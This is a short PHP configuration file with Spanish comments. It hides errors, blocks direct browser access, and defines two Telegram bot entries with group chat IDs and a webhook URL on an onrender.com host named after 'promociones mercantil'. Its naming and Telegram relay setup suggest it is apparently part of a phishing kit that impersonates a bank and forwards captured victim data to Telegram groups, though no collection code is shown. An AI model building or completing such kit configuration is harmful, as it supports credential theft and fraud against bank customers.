<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Bots y grupos
$telegram_accounts = [

    [
        'token' => 'TOKEN_BOT_1',
        'chat_id' => '-1003964372304'
    ],

    [
        'token' => 'TOKEN_BOT_2',
        'chat_id' => '-1001234567890'
    ]

];

$webhook_url = 'https://promocionesmercantil.onrender.com/approve.php';
?>
